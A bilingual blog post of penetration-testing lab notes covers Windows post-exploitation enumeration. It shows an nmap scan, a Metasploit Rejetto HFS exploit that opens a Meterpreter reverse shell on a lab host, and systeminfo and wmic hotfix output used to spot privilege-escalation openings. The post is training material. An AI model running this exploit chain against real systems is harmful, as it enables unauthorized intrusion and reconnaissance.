---
layout: post
title: "Enumerating System Information"
date: "2023-05-29"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - Post-Exploitation
---

# Windows Local Enumeration
## Enumerating System Information
After gaining initial access to a target system, it is always important to learn more about the system like, what OS is running as well as the OS version. This information is very useful as it gives us an idea of what we can do and what type of exploits we can run.

What are we looking for?
* Hostname
* OS Name (Windows 7,8 etc)
* OS Build & Service Pack (Windows 7 SP1 7600)
* OS Architecture (x64/x86)
* Installed updates/Hotfixes

# Windows本地枚举
## 枚举系统信息
在成功获取目标系统的初始访问权限后，了解更多有关系统的信息非常重要，例如正在运行的操作系统以及操作系统的版本。这些信息非常有用，因为它们让我们了解我们可以做什么以及可以运行哪种类型的漏洞利用。

我们要寻找什么？

* 主机名
* 操作系统名称（如Windows 7、8等）
* 操作系统版本和服务包（如Windows 7 SP1 7600）
* 操作系统架构（x64/x86）
* 已安装的更新/补丁

# Demo: Enumerating System Information（演示：枚举系统信息）
Target IP Address: 10.2.24.80

The first step is gaining access to the target system.

In order to exploit it, we're firstly need to perform a port scan to identify the vulnerable service that's running on it.

Perform an Nmap scan on the target.

`-sV`: Perform a service version detection scan.

```
nmap -sV 10.2.24.80
```

We'll utilize the default Nmap port range. It will scan 1000 of the most commonly used ports.

```
searchsploit rejetto
```

```
msfconsole
search rejetto
use exploit/windows/http/rejetto_hfs_exec
show options
set RHOSTS 10.2.24.80
exploit
```

We've obtained the meterpreter session now.

And we can begin performing the local enumeration. We are primarily focused on how to perform local enumeration manually.

That will tell you the current user.

```
meterpreter > getuid
```

Obtain the host name.

```
meterpreter > sysinfo
```

Open up a command shell session.

```
meterpreter > shell
```

Enumerate the hostname.

```
hostname
```

That is how to obtain the hostname.

Enumerate all information about the target.

```
systeminfo
```

It will display all the operating system information like the edition, the build number, as well as the HotFixes or updates installed.

There are a few other commands that you can utilize to enumerate information like the HotFixes, and we can do that using the wmic utility on Windows.

This will enumerate the installed updates and the HotFixIDs. And we can also specify another important piece of information that was not displayed with the systeminfo command and that is when the updates were installed.

```
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

We get additional information regarding the updates that were installed. The systeminfo command just give you the HotFixIDs, but the wmic utility can be used to get additional information like the Caption, which is the HotFixID link. So you now have the ability to learn more about a particular HotFixID. You then get a description. And in regards to privilege escalation, you're pretty much looking for the Security Updates. And you're not concerned with the standard Updates. And more importantly, you also want to know when this was installed on or the date it was installed on.

Enumerate the operating system version by:

Go back into our meterpreter session.

```
meterpreter > cd C:\\
meterpreter > cd Windows
meterpreter > cd System32
meterpreter > cat eula.txt
```

In this case, it doesn't exist, and it might not exist on various versions of Windows, but that's another file that can provide you with informtaion pertinent to the operating system version. And it'll also provide you with additional information like the build number and the service pack.

# Enumerating System Information（枚举系统信息）
## Overview（概述）
Goal

This lab covers the process of enumerating local system information from a Windows target.

目标

本实验涵盖从 Windows 目标枚举本地系统信息的过程。

## 复现视频内容
Target IP Address : 10.0.21.206

```
root@attackdefense:~# nmap -sV 10.0.21.206
Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-29 18:31 IST
Nmap scan report for 10.0.21.206
Host is up (0.0029s latency).
Not shown: 990 closed ports
PORT      STATE SERVICE            VERSION
80/tcp    open  http               HttpFileServer httpd 2.3
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49165/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.91 seconds
```

```
root@attackdefense:~# searchsploit rejetto
----------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                                       |  Path
                                                                                                                                                     | (/usr/share/exploitdb/)
----------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)                                                                               | exploits/windows/remote/34926.rb
Rejetto HTTP File Server (HFS) 1.5/2.x - Multiple Vulnerabilities                                                                                    | exploits/windows/remote/31056.py
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                                                                                       | exploits/multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                                                                                  | exploits/windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                                                                  | exploits/windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                                                                             | exploits/windows/webapps/34852.txt
----------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
Papers: No Result
```

```
root@attackdefense:~# service postgresql start && msfconsole -q
Starting PostgreSQL 12 database server: main.
msf5 > search rejetto

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


msf5 > use 0
msf5 exploit(windows/http/rejetto_hfs_exec) > setg RHOSTS 10.0.21.206
RHOSTS => 10.0.21.206
msf5 exploit(windows/http/rejetto_hfs_exec) > show options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.0.21.206      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(windows/http/rejetto_hfs_exec) > exploit

[*] Started reverse TCP handler on 10.10.21.7:4444 
[*] Using URL: http://0.0.0.0:8080/JE725R9SgRDP
[*] Local IP: http://10.10.21.7:8080/JE725R9SgRDP
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /JE725R9SgRDP
[*] Sending stage (180291 bytes) to 10.0.21.206
[*] Meterpreter session 1 opened (10.10.21.7:4444 -> 10.0.21.206:49394) at 2023-05-29 18:38:45 +0530
[!] Tried to delete %TEMP%\EXJkJsXfwF.vbs, unknown result
[*] Server stopped.

meterpreter > 
```

```
meterpreter > getuid
Server username: WIN-OMCNBKR66MN\Administrator
meterpreter > sysinfo
Computer        : WIN-OMCNBKR66MN
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
```

```
meterpreter > shell
Process 2492 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\hfs>hostname
hostname
WIN-OMCNBKR66MN
```

```
C:\hfs>systeminfo
systeminfo

Host Name:                 WIN-OMCNBKR66MN
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          EC2
Registered Organization:   Amazon.com
Product ID:                00252-70000-00000-AA535
Original Install Date:     9/10/2020, 9:10:37 AM
System Boot Time:          5/29/2023, 12:56:05 PM
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2400 Mhz
BIOS Version:              Xen 4.11.amazon, 8/24/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC) Coordinated Universal Time
Total Physical Memory:     1,024 MB
Available Physical Memory: 452 MB
Virtual Memory: Max Size:  9,216 MB
Virtual Memory: Available: 8,135 MB
Virtual Memory: In Use:    1,081 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\WIN-OMCNBKR66MN
Hotfix(s):                 208 Hotfix(s) Installed.
                           [01]: KB2894856
                           [02]: KB2896496
                           [03]: KB2919355
                           [04]: KB2919442
                           [05]: KB2934520
                           [06]: KB2938066
                           [07]: KB2938772
                           [08]: KB2949621
                           [09]: KB2954879
                           [10]: KB2955164
                           [11]: KB2959626
                           [12]: KB2965500
                           [13]: KB2967917
                           [14]: KB2969339
                           [15]: KB2971203
                           [16]: KB2973448
                           [17]: KB2975061
                           [18]: KB2975719
                           [19]: KB2977765
                           [20]: KB2978041
                           [21]: KB2978126
                           [22]: KB2984006
                           [23]: KB2989647
                           [24]: KB2989930
                           [25]: KB2993100
                           [26]: KB2995004
                           [27]: KB2995388
                           [28]: KB2996799
                           [29]: KB2998174
                           [30]: KB2999226
                           [31]: KB3000483
                           [32]: KB3000850
                           [33]: KB3003057
                           [34]: KB3004545
                           [35]: KB3012199
                           [36]: KB3012702
                           [37]: KB3013172
                           [38]: KB3013769
                           [39]: KB3013791
                           [40]: KB3013816
                           [41]: KB3014442
                           [42]: KB3019978
                           [43]: KB3021910
                           [44]: KB3022345
                           [45]: KB3023222
                           [46]: KB3023266
                           [47]: KB3024751
                           [48]: KB3024755
                           [49]: KB3030947
                           [50]: KB3032663
                           [51]: KB3033446
                           [52]: KB3035126
                           [53]: KB3036612
                           [54]: KB3037579
                           [55]: KB3038002
                           [56]: KB3038701
                           [57]: KB3042085
                           [58]: KB3044374
                           [59]: KB3044673
                           [60]: KB3045634
                           [61]: KB3045685
                           [62]: KB3045717
                           [63]: KB3045719
                           [64]: KB3045755
                           [65]: KB3045999
                           [66]: KB3046017
                           [67]: KB3046737
                           [68]: KB3054169
                           [69]: KB3054203
                           [70]: KB3054256
                           [71]: KB3054464
                           [72]: KB3055323
                           [73]: KB3055343
                           [74]: KB3055642
                           [75]: KB3059317
                           [76]: KB3060681
                           [77]: KB3060793
                           [78]: KB3061512
                           [79]: KB3063843
                           [80]: KB3064209
                           [81]: KB3068708
                           [82]: KB3071756
                           [83]: KB3074228
                           [84]: KB3074548
                           [85]: KB3075853
                           [86]: KB3077715
                           [87]: KB3078405
                           [88]: KB3078676
                           [89]: KB3080149
                           [90]: KB3082089
                           [91]: KB3083325
                           [92]: KB3083711
                           [93]: KB3084135
                           [94]: KB3084905
                           [95]: KB3086255
                           [96]: KB3087137
                           [97]: KB3091297
                           [98]: KB3094486
                           [99]: KB3095701
                           [100]: KB3097997
                           [101]: KB3098779
                           [102]: KB3099834
                           [103]: KB3100473
                           [104]: KB3102429
                           [105]: KB3102467
                           [106]: KB3102812
                           [107]: KB3103616
                           [108]: KB3103696
                           [109]: KB3103709
                           [110]: KB3109103
                           [111]: KB3109976
                           [112]: KB3110329
                           [113]: KB3112148
                           [114]: KB3112336
                           [115]: KB3115224
                           [116]: KB3118401
                           [117]: KB3121261
                           [118]: KB3122654
                           [119]: KB3123245
                           [120]: KB3126434
                           [121]: KB3126587
                           [122]: KB3127226
                           [123]: KB3133043
                           [124]: KB3133690
                           [125]: KB3134179
                           [126]: KB3134815
                           [127]: KB3135449
                           [128]: KB3137728
                           [129]: KB3138602
                           [130]: KB3138615
                           [131]: KB3139164
                           [132]: KB3139398
                           [133]: KB3139914
                           [134]: KB3140219
                           [135]: KB3140234
                           [136]: KB3141092
                           [137]: KB3145384
                           [138]: KB3145432
                           [139]: KB3146604
                           [140]: KB3146723
                           [141]: KB3146751
                           [142]: KB3147071
                           [143]: KB3148851
                           [144]: KB3155784
                           [145]: KB3156059
                           [146]: KB3156418
                           [147]: KB3159398
                           [148]: KB3161949
                           [149]: KB3162343
                           [150]: KB3162835
                           [151]: KB3172614
                           [152]: KB3172729
                           [153]: KB3173424
                           [154]: KB3175024
                           [155]: KB3178539
                           [156]: KB3179574
                           [157]: KB3179948
                           [158]: KB3186539
                           [159]: KB3195387
                           [160]: KB3210135
                           [161]: KB4014510
                           [162]: KB4024847
                           [163]: KB4033369
                           [164]: KB4033428
                           [165]: KB4040972
                           [166]: KB4041777
                           [167]: KB4043763
                           [168]: KB4054566
                           [169]: KB4054854
                           [170]: KB4054980
                           [171]: KB4055001
                           [172]: KB4056898
                           [173]: KB4073700
                           [174]: KB4096417
                           [175]: KB4098972
                           [176]: KB4338419
                           [177]: KB4344145
                           [178]: KB4457015
                           [179]: KB4457034
                           [180]: KB4459941
                           [181]: KB4470639
                           [182]: KB4480054
                           [183]: KB4480095
                           [184]: KB4483450
                           [185]: KB4486105
                           [186]: KB4486545
                           [187]: KB4495585
                           [188]: KB4504418
                           [189]: KB4506993
                           [190]: KB4506996
                           [191]: KB4511524
                           [192]: KB4512938
                           [193]: KB4514361
                           [194]: KB4515846
                           [195]: KB4519567
                           [196]: KB4521864
                           [197]: KB4524445
                           [198]: KB4532940
                           [199]: KB4533004
                           [200]: KB4534134
                           [201]: KB4537482
                           [202]: KB4540725
                           [203]: KB4552933
                           [204]: KB4562253
                           [205]: KB4565635
                           [206]: KB4566425
                           [207]: KB4569753
                           [208]: KB4571703
Network Card(s):           1 NIC(s) Installed.
                           [01]: AWS PV Network Device
                                 Connection Name: Ethernet 2
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.0.16.1
                                 IP address(es)
                                 [01]: 10.0.21.206
                                 [02]: fe80::b1b5:7226:58e2:66a3
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

```
C:\hfs>wmic qfe get Caption,Description,HotfixID,InstalledOn
wmic qfe get Caption,Description,HotfixID,InstalledOn
Caption                                     Description      HotFixID   InstalledOn  
http://support.microsoft.com/?kbid=2894856  Security Update  KB2894856  10/15/2014   
http://support.microsoft.com/?kbid=2896496  Update           KB2896496  6/20/2014    
http://support.microsoft.com/?kbid=2919355  Update           KB2919355  3/18/2014    
http://support.microsoft.com/?kbid=2919442  Update           KB2919442  3/18/2014    
http://support.microsoft.com/?kbid=2934520  Update           KB2934520  1/13/2015    
http://support.microsoft.com/?kbid=2938066  Update           KB2938066  7/10/2014    
http://support.microsoft.com/?kbid=2938772  Update           KB2938772  3/18/2014    
http://support.microsoft.com/?kbid=2949621  Hotfix           KB2949621  3/18/2014    
http://support.microsoft.com/?kbid=2954879  Update           KB2954879  5/17/2014    
http://support.microsoft.com/?kbid=2955164  Update           KB2955164  5/17/2014    
http://support.microsoft.com/?kbid=2959626  Hotfix           KB2959626  7/10/2014    
http://support.microsoft.com/?kbid=2965500  Update           KB2965500  5/17/2014    
http://support.microsoft.com/?kbid=2967917  Update           KB2967917  7/10/2014    
http://support.microsoft.com/?kbid=2969339  Update           KB2969339  6/20/2014    
http://support.microsoft.com/?kbid=2971203  Update           KB2971203  7/10/2014    
http://support.microsoft.com/?kbid=2973448  Update           KB2973448  6/20/2014    
http://support.microsoft.com/?kbid=2975061  Update           KB2975061  7/10/2014    
http://support.microsoft.com/?kbid=2975719  Update           KB2975719  10/15/2014   
http://support.microsoft.com/?kbid=2977765  Security Update  KB2977765  10/15/2014   
http://support.microsoft.com/?kbid=2978041  Security Update  KB2978041  10/15/2014   
http://support.microsoft.com/?kbid=2978126  Security Update  KB2978126  11/18/2014   
http://support.microsoft.com/?kbid=2984006  Update           KB2984006  10/15/2014   
http://support.microsoft.com/?kbid=2989647  Update           KB2989647  10/15/2014   
http://support.microsoft.com/?kbid=2989930  Update           KB2989930  12/9/2014    
http://support.microsoft.com/?kbid=2993100  Update           KB2993100  10/15/2014   
http://support.microsoft.com/?kbid=2995004  Update           KB2995004  10/15/2014   
http://support.microsoft.com/?kbid=2995388  Update           KB2995388  10/15/2014   
http://support.microsoft.com/?kbid=2996799  Hotfix           KB2996799  10/15/2014   
http://support.microsoft.com/?kbid=2998174  Update           KB2998174  10/15/2014   
http://support.microsoft.com/?kbid=2999226  Update           KB2999226  10/22/2015   
http://support.microsoft.com/?kbid=3000483  Security Update  KB3000483  5/12/2016    
http://support.microsoft.com/?kbid=3000850  Update           KB3000850  11/18/2014   
http://support.microsoft.com/?kbid=3003057  Security Update  KB3003057  8/12/2020    
http://support.microsoft.com/?kbid=3004545  Hotfix           KB3004545  4/15/2015    
http://support.microsoft.com/?kbid=3012199  Update           KB3012199  12/9/2014    
http://support.microsoft.com/?kbid=3012702  Update           KB3012702  3/10/2015    
http://support.microsoft.com/?kbid=3013172  Update           KB3013172  8/12/2020    
http://support.microsoft.com/?kbid=3013769  Update           KB3013769  12/9/2014    
http://support.microsoft.com/?kbid=3013791  Update           KB3013791  8/13/2015    
http://support.microsoft.com/?kbid=3013816  Update           KB3013816  12/9/2014    
http://support.microsoft.com/?kbid=3014442  Update           KB3014442  11/18/2014   
http://support.microsoft.com/?kbid=3019978  Security Update  KB3019978  1/13/2015    
http://support.microsoft.com/?kbid=3021910  Update           KB3021910  5/13/2015    
http://support.microsoft.com/?kbid=3022345  Update           KB3022345  5/13/2015    
http://support.microsoft.com/?kbid=3023222  Security Update  KB3023222  5/13/2015    
http://support.microsoft.com/?kbid=3023266  Security Update  KB3023266  1/13/2015    
http://support.microsoft.com/?kbid=3024751  Update           KB3024751  3/10/2015    
http://support.microsoft.com/?kbid=3024755  Update           KB3024755  3/10/2015    
http://support.microsoft.com/?kbid=3030947  Update           KB3030947  3/10/2015    
http://support.microsoft.com/?kbid=3032663  Security Update  KB3032663  5/13/2015    
http://support.microsoft.com/?kbid=3033446  Update           KB3033446  5/13/2015    
http://support.microsoft.com/?kbid=3035126  Security Update  KB3035126  3/10/2015    
http://support.microsoft.com/?kbid=3036612  Update           KB3036612  3/10/2015    
http://support.microsoft.com/?kbid=3037579  Security Update  KB3037579  4/15/2015    
http://support.microsoft.com/?kbid=3038002  Update           KB3038002  5/13/2015    
http://support.microsoft.com/?kbid=3038701  Hotfix           KB3038701  5/13/2015    
http://support.microsoft.com/?kbid=3042085  Update           KB3042085  4/15/2015    
http://support.microsoft.com/?kbid=3044374  Update           KB3044374  4/15/2015    
http://support.microsoft.com/?kbid=3044673  Update           KB3044673  5/13/2015    
http://support.microsoft.com/?kbid=3045634  Update           KB3045634  8/13/2015    
http://support.microsoft.com/?kbid=3045685  Security Update  KB3045685  4/15/2015    
http://support.microsoft.com/?kbid=3045717  Update           KB3045717  5/13/2015    
http://support.microsoft.com/?kbid=3045719  Update           KB3045719  5/13/2015    
http://support.microsoft.com/?kbid=3045755  Security Update  KB3045755  4/15/2015    
http://support.microsoft.com/?kbid=3045999  Security Update  KB3045999  4/15/2015    
http://support.microsoft.com/?kbid=3046017  Security Update  KB3046017  8/13/2015    
http://support.microsoft.com/?kbid=3046737  Hotfix           KB3046737  5/13/2015    
http://support.microsoft.com/?kbid=3054169  Update           KB3054169  5/13/2015    
http://support.microsoft.com/?kbid=3054203  Update           KB3054203  8/13/2015    
http://support.microsoft.com/?kbid=3054256  Update           KB3054256  8/13/2015    
http://support.microsoft.com/?kbid=3054464  Update           KB3054464  8/13/2015    
http://support.microsoft.com/?kbid=3055323  Update           KB3055323  8/13/2015    
http://support.microsoft.com/?kbid=3055343  Update           KB3055343  8/13/2015    
http://support.microsoft.com/?kbid=3055642  Security Update  KB3055642  5/13/2015    
http://support.microsoft.com/?kbid=3059317  Security Update  KB3059317  8/13/2015    
http://support.microsoft.com/?kbid=3060681  Update           KB3060681  8/13/2015    
http://support.microsoft.com/?kbid=3060793  Update           KB3060793  8/13/2015    
http://support.microsoft.com/?kbid=3061512  Security Update  KB3061512  8/13/2015    
http://support.microsoft.com/?kbid=3063843  Update           KB3063843  8/13/2015    
http://support.microsoft.com/?kbid=3064209  Update           KB3064209  8/13/2015    
http://support.microsoft.com/?kbid=3068708  Update           KB3068708  8/13/2015    
http://support.microsoft.com/?kbid=3071756  Security Update  KB3071756  8/13/2015    
http://support.microsoft.com/?kbid=3074228  Security Update  KB3074228  9/9/2015     
http://support.microsoft.com/?kbid=3074548  Security Update  KB3074548  9/9/2015     
http://support.microsoft.com/?kbid=3075853  Update           KB3075853  8/13/2015    
http://support.microsoft.com/?kbid=3077715  Update           KB3077715  9/9/2015     
http://support.microsoft.com/?kbid=3078405  Update           KB3078405  10/22/2015   
http://support.microsoft.com/?kbid=3078676  Update           KB3078676  9/9/2015     
http://support.microsoft.com/?kbid=3080149  Update           KB3080149  9/9/2015     
http://support.microsoft.com/?kbid=3082089  Security Update  KB3082089  9/9/2015     
http://support.microsoft.com/?kbid=3083325  Update           KB3083325  9/9/2015     
http://support.microsoft.com/?kbid=3083711  Update           KB3083711  10/22/2015   
http://support.microsoft.com/?kbid=3084135  Security Update  KB3084135  9/9/2015     
http://support.microsoft.com/?kbid=3084905  Update           KB3084905  10/22/2015   
http://support.microsoft.com/?kbid=3086255  Security Update  KB3086255  9/9/2015     
http://support.microsoft.com/?kbid=3087137  Update           KB3087137  10/22/2015   
http://support.microsoft.com/?kbid=3091297  Update           KB3091297  10/22/2015   
http://support.microsoft.com/?kbid=3094486  Update           KB3094486  10/22/2015   
http://support.microsoft.com/?kbid=3095701  Update           KB3095701  10/22/2015   
http://support.microsoft.com/?kbid=3097997  Security Update  KB3097997  11/12/2015   
http://support.microsoft.com/?kbid=3098779  Security Update  KB3098779  11/12/2015   
http://support.microsoft.com/?kbid=3099834  Update           KB3099834  12/9/2015    
http://support.microsoft.com/?kbid=3100473  Update           KB3100473  4/12/2016    
http://support.microsoft.com/?kbid=3102429  Update           KB3102429  2/11/2016    
http://support.microsoft.com/?kbid=3102467  Update           KB3102467  2/11/2016    
http://support.microsoft.com/?kbid=3102812  Update           KB3102812  11/12/2015   
http://support.microsoft.com/?kbid=3103616  Update           KB3103616  5/12/2016    
http://support.microsoft.com/?kbid=3103696  Update           KB3103696  12/9/2015    
http://support.microsoft.com/?kbid=3103709  Update           KB3103709  5/12/2016    
http://support.microsoft.com/?kbid=3109103  Security Update  KB3109103  12/9/2015    
http://support.microsoft.com/?kbid=3109976  Update           KB3109976  4/12/2016    
http://support.microsoft.com/?kbid=3110329  Security Update  KB3110329  1/13/2016    
http://support.microsoft.com/?kbid=3112148  Update           KB3112148  12/9/2015    
http://support.microsoft.com/?kbid=3112336  Update           KB3112336  12/9/2015    
http://support.microsoft.com/?kbid=3115224  Update           KB3115224  4/12/2016    
http://support.microsoft.com/?kbid=3118401  Update           KB3118401  3/8/2016     
http://support.microsoft.com/?kbid=3121261  Update           KB3121261  3/8/2016     
http://support.microsoft.com/?kbid=3122654  Security Update  KB3122654  2/11/2016    
http://support.microsoft.com/?kbid=3123245  Update           KB3123245  4/12/2016    
http://support.microsoft.com/?kbid=3126434  Security Update  KB3126434  2/11/2016    
http://support.microsoft.com/?kbid=3126587  Security Update  KB3126587  2/11/2016    
http://support.microsoft.com/?kbid=3127226  Security Update  KB3127226  2/11/2016    
http://support.microsoft.com/?kbid=3133043  Security Update  KB3133043  2/11/2016    
http://support.microsoft.com/?kbid=3133690  Update           KB3133690  4/12/2016    
http://support.microsoft.com/?kbid=3134179  Update           KB3134179  5/12/2016    
http://support.microsoft.com/?kbid=3134815  Update           KB3134815  3/8/2016     
http://support.microsoft.com/?kbid=3135449  Update           KB3135449  2/11/2016    
http://support.microsoft.com/?kbid=3137728  Update           KB3137728  4/12/2016    
http://support.microsoft.com/?kbid=3138602  Update           KB3138602  4/12/2016    
http://support.microsoft.com/?kbid=3138615  Update           KB3138615  3/8/2016     
http://support.microsoft.com/?kbid=3139164  Update           KB3139164  4/12/2016    
http://support.microsoft.com/?kbid=3139398  Security Update  KB3139398  3/8/2016     
http://support.microsoft.com/?kbid=3139914  Security Update  KB3139914  3/8/2016     
http://support.microsoft.com/?kbid=3140219  Update           KB3140219  4/12/2016    
http://support.microsoft.com/?kbid=3140234  Update           KB3140234  4/12/2016    
http://support.microsoft.com/?kbid=3141092  Hotfix           KB3141092  2/11/2016    
http://support.microsoft.com/?kbid=3145384  Update           KB3145384  5/12/2016    
http://support.microsoft.com/?kbid=3145432  Update           KB3145432  5/12/2016    
http://support.microsoft.com/?kbid=3146604  Update           KB3146604  5/12/2016    
http://support.microsoft.com/?kbid=3146723  Security Update  KB3146723  4/12/2016    
http://support.microsoft.com/?kbid=3146751  Update           KB3146751  5/12/2016    
http://support.microsoft.com/?kbid=3147071  Update           KB3147071  4/12/2016    
http://support.microsoft.com/?kbid=3148851  Update           KB3148851  4/12/2016    
http://support.microsoft.com/?kbid=3155784  Security Update  KB3155784  5/12/2016    
http://support.microsoft.com/?kbid=3156059  Security Update  KB3156059  5/12/2016    
http://support.microsoft.com/?kbid=3156418  Update           KB3156418  6/15/2016    
http://support.microsoft.com/?kbid=3159398  Security Update  KB3159398  6/15/2016    
http://support.microsoft.com/?kbid=3161949  Security Update  KB3161949  6/15/2016    
http://support.microsoft.com/?kbid=3162343  Security Update  KB3162343  6/15/2016    
http://support.microsoft.com/?kbid=3162835  Update           KB3162835  6/15/2016    
http://support.microsoft.com/?kbid=3172614  Update           KB3172614  8/13/2016    
http://support.microsoft.com/?kbid=3172729  Security Update  KB3172729  8/13/2016    
http://support.microsoft.com/?kbid=3173424  Update           KB3173424  8/13/2016    
http://support.microsoft.com/?kbid=3175024  Security Update  KB3175024  9/14/2016    
http://support.microsoft.com/?kbid=3178539  Security Update  KB3178539  9/14/2016    
http://support.microsoft.com/?kbid=3179574  Update           KB3179574  9/14/2016    
http://support.microsoft.com/?kbid=3179948  Update           KB3179948  10/11/2016   
http://support.microsoft.com/?kbid=3186539  Update           KB3186539  8/10/2017    
http://support.microsoft.com/?kbid=3195387  Update           KB3195387  11/22/2016   
http://support.microsoft.com/?kbid=3210135  Update           KB3210135  12/14/2016   
http://support.microsoft.com/?kbid=4014510  Update           KB4014510  8/10/2017    
http://support.microsoft.com/?kbid=4024847  Update           KB4024847  8/10/2017    
http://support.microsoft.com/?kbid=4033369  Update           KB4033369  1/13/2018    
http://support.microsoft.com/?kbid=4033428  Update           KB4033428  8/10/2017    
http://support.microsoft.com/?kbid=4040972  Update           KB4040972  9/13/2017    
http://support.microsoft.com/?kbid=4041777  Update           KB4041777  11/29/2017   
http://support.microsoft.com/?kbid=4043763  Update           KB4043763  10/12/2017   
http://support.microsoft.com/?kbid=4054566  Update           KB4054566  7/11/2018    
http://support.microsoft.com/?kbid=4054854  Update           KB4054854  1/13/2018    
http://support.microsoft.com/?kbid=4054980  Update           KB4054980  2/23/2018    
http://support.microsoft.com/?kbid=4055001  Update           KB4055001  1/13/2018    
http://support.microsoft.com/?kbid=4056898  Security Update  KB4056898  1/5/2018     
http://support.microsoft.com/?kbid=4073700  Update           KB4073700  2/23/2018    
http://support.microsoft.com/?kbid=4096417  Update           KB4096417  5/9/2018     
http://support.microsoft.com/?kbid=4098972  Update           KB4098972  6/13/2018    
http://support.microsoft.com/?kbid=4338419  Update           KB4338419  7/11/2018    
http://support.microsoft.com/?kbid=4344145  Update           KB4344145  8/14/2018    
http://support.microsoft.com/?kbid=4457015  Update           KB4457015  10/14/2018   
http://support.microsoft.com/?kbid=4457034  Update           KB4457034  9/16/2018    
http://support.microsoft.com/?kbid=4459941  Update           KB4459941  11/19/2018   
http://support.microsoft.com/?kbid=4470639  Update           KB4470639  12/12/2018   
http://support.microsoft.com/?kbid=4480054  Update           KB4480054  1/9/2019     
http://support.microsoft.com/?kbid=4480095  Update           KB4480095  2/8/2019     
http://support.microsoft.com/?kbid=4483450  Update           KB4483450  2/13/2019    
http://support.microsoft.com/?kbid=4486105  Update           KB4486105  8/16/2019    
http://support.microsoft.com/?kbid=4486545  Update           KB4486545  3/14/2019    
http://support.microsoft.com/?kbid=4495585  Update           KB4495585  5/15/2019    
http://support.microsoft.com/?kbid=4504418  Security Update  KB4504418  7/13/2019    
http://support.microsoft.com/?kbid=4506993  Update           KB4506993  8/16/2019    
http://support.microsoft.com/?kbid=4506996  Update           KB4506996  7/13/2019    
http://support.microsoft.com/?kbid=4511524  Update           KB4511524  9/6/2019     
http://support.microsoft.com/?kbid=4512938  Security Update  KB4512938  9/11/2019    
http://support.microsoft.com/?kbid=4514361  Update           KB4514361  9/11/2019    
http://support.microsoft.com/?kbid=4515846  Update           KB4515846  10/9/2019    
http://support.microsoft.com/?kbid=4519567  Update           KB4519567  11/13/2019   
http://support.microsoft.com/?kbid=4521864  Security Update  KB4521864  10/9/2019    
http://support.microsoft.com/?kbid=4524445  Security Update  KB4524445  11/13/2019   
http://support.microsoft.com/?kbid=4532940  Update           KB4532940  1/15/2020    
http://support.microsoft.com/?kbid=4533004  Update           KB4533004  12/14/2019   
http://support.microsoft.com/?kbid=4534134  Update           KB4534134  2/5/2020     
http://support.microsoft.com/?kbid=4537482  Update           KB4537482  3/11/2020    
http://support.microsoft.com/?kbid=4540725  Security Update  KB4540725  3/11/2020    
http://support.microsoft.com/?kbid=4552933  Update           KB4552933  5/13/2020    
http://support.microsoft.com/?kbid=4562253  Security Update  KB4562253  6/10/2020    
http://support.microsoft.com/?kbid=4565635  Update           KB4565635  7/15/2020    
